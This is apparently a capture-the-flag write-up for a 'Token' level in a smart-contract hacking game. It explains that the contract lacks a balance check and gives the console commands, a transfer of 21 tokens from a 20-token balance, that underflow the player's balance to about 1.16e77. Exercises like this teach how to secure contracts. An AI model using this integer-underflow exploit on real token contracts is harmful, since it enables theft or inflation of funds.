# Token

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

## Solution

The contract doesn't check for a valid balance so we underflow our balance to get a lot of coins.

1. Sent 21 tokens to the contract owner using `await contract.transfer(await contract.address, 21)`
2. Verified that my balance became great again with `await contract.balanceOf('0xFe8070fD6766868a66773A13035a1Cb4DF79A1E0')`

**Final Balance:** 1.15792089237316195423570985008687907853269984665640564039457584007913129639935e+77
